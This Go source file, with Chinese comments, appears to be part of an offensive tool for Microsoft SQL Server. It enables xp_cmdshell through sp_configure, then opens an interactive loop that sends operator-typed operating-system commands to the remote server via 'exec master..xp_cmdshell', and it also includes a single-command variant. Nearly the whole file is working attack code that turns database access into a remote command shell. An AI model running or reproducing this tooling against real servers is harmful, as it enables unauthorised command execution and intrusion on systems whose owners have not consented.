package pac

import (
	"bufio"
	"database/sql"
	"fmt"
	"os"
	"strings"
)

// 开启xp_cmdshell
func MssqlXpcmdshell(conn *sql.DB) (err error) {

	sqlstr1 := "select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';"
	MssqlCMD(sqlstr1, conn) //

	Info("select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'执行正常")
	Info("尝试开启xp_cmdshell")
	sqlstr2 := "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;"
	res2 := MssqlCMD(sqlstr2, conn)
	Info("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;执行正常")
	err2, v2 := PrintRow(res2)
	fmt.Sprintf("%v", v2)
	if err2 != nil {
		Err(err2)
	}
	return err
}

// 开启xpcmd之后获取一个cmd shell
func MssqlCMDConsole(conn *sql.DB) {
	Info("执行系统命令")
	reader := bufio.NewReader(os.Stdin)
	for {
		xpcmd := "exec master..xp_cmdshell "
		var cmd string
		fmt.Printf("%s:%s> $ ", Rhost, Rport)
		cmd, _ = reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")
		if cmd == "exit" || cmd == "q" || cmd == "quit" {
			break
		}

		aa := fmt.Sprintf("%s'%s';", xpcmd, cmd)
		xpcmd = strings.TrimRight(xpcmd, "\r\n")
		Info(aa)
		MssqlCMD(aa, conn)
	}
}

// 执行单条命令
func MssqlCMDone(cmd1 string, conn *sql.DB) (err error) {
	Info("执行系统命令")
	xpcmd := "exec master..xp_cmdshell "
	xpcmd = xpcmd + "\"" + cmd1 + "\"" + ";"
	xpcmd = strings.TrimRight(xpcmd, "\r\n")
	Info(xpcmd)
	MssqlCMD(xpcmd, conn)
	return err
}
